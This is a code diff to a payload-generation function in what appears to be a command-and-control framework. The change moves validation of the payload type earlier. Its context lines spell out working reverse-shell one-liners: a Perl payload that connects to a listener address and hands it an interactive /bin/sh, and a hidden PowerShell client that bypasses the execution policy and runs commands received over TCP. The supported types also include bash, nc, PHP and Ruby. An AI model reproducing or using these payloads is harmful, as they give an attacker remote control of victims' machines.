@@ -573,6 +573,15 @@ def generate_payload(listener_ip, listener_port, payload_type="python", arch="x6
         return {"status": "error", "message": f"Invalid listener port: {listener_port}. Must be 1-65535."}
     listener_port = int(listener_port)
 
+    available_payload_types = (
+        "python", "python3", "bash", "nc", "nc_mkfifo", "php", "ruby", "perl", "powershell"
+    )
+    if payload_type not in available_payload_types:
+        return {
+            "status": "error",
+            "message": f"Unknown payload type: {payload_type}. Available: {', '.join(available_payload_types)}",
+        }
+
     if not api_key:
         with C2_LOCK:
             for lst in LISTENERS.values():
@@ -595,9 +604,6 @@ def generate_payload(listener_ip, listener_port, payload_type="python", arch="x6
         "perl": f"perl -e 'use Socket;$i=\"{listener_ip}\";$p={listener_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));send(S,\"{api_key}\",0);recv(S,$x,1024,0);open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
         "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{listener_ip}',{listener_port});$s=$c.GetStream();$m=[text.encoding]::ASCII.GetBytes('{api_key}');$s.Write($m,0,$m.Length);$b=New-Object byte[] 1024;$s.Read($b,0,$b.Length)|Out-Null;while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
     }
-
-    if payload_type not in payloads:
-        return {"status": "error", "message": f"Unknown payload type: {payload_type}. Available: {', '.join(payloads.keys())}"}
 
     return {
         "status": "success",
